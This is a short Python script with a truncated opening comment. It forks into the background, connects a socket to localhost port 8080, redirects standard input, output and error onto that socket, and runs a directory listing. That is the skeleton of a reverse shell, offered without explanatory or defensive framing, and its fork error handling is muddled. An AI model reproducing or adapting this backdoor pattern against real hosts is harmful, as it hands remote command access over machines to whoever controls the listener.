# Make sure to run this on Linux because the fork() function

import socket
import subprocess
import os

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno,error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid :(')
socket_handler.connect(("localhost",8080))
os.dup2(socket_handler.fileno(),0) 
os.dup2(socket_handler.fileno(),1)
os.dup2(socket_handler.fileno(),2)
list_files = subprocess.call(["ls","-i"])